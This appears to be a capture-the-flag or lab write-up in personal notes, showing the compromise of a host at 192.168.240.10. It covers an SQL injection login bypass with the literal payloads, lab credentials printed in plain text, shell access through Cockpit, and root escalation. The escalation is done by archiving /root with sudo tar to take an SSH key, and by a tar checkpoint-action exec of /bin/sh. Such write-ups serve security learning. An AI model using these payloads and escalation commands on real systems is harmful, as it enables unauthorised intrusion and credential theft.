## Takeaway
- Abuse how Linux Shell interprets wildcards `*`:
	- https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
## Metadata
- Both `feroxbuster` and `nikto` will identify that port `80` is running a login portal at `http://192.168.240.10/login.php`.![[Pasted image 20240323131958.png]]
	- The login parameter is subjected to `SQL injection`![[Pasted image 20240323132518.png]]
	- Using `admin' or 1=1-- -` as username will be redirected to `blocked.html`. However Since the backend if using `%` within the SQL query, using `'-- -` alone is enough for one to bypass authentication and redirected to `password-dashboard.php` to get two pairs of credentials with password base64-encoded.![[Pasted image 20240323133545.png]]
		- `james`: canttouchhhthiss@455152
		- `cameron`: thisscanttbetouchedd@455152
- port `9090` is running `Cockpit` which is a web-based graphical interface for servers.![[Pasted image 20240323134550.png]]
- Running `sudo -l` as `james` will show the user can run `/usr/bin/tar -czvf /tmp/backup.tar.gz *` as `root` without password.![[Pasted image 20240323134846.png]]
# Exploitation
## Shell as james
- Login using `james:canttouchhhthiss@455152` at `https://192.168.240.10:9090/system/terminal`.
- Navigate to terminal section to obtain a shell as `james`.![[Pasted image 20240323134744.png]]
# PrivEsc 
# 1
- Run `sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /root` to archive the `/root` folder, one can identify a SSH private key.![[Pasted image 20240323144421.png]]
- Transfer the archive onto attacker machine and extract `id_rsa`, run `ssh root@192.168.240.10 -i id_rsa` to obtain a SSH `root` session.
# 2
- Run `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` directly.